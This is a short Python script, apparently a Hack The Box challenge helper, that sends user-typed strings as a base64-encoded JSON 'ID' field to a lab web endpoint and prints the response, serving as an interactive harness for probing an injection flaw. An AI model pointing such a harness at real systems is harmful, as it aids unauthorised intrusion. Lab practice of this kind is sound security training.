
import requests
from base64 import b64encode
from bs4 import BeautifulSoup
import json

while True:
	injection_str = raw_input("Enter string: ")
	payload = b64encode(json.dumps({"ID": injection_str.strip()}))
	url = 'http://docker.hackthebox.eu:32023/index.php?obj=' + payload
	r = requests.get(url)
	soup = BeautifulSoup(r.text, 'html.parser')
	body = soup.find('body').text.strip()
	print ("\n", body, "\n")
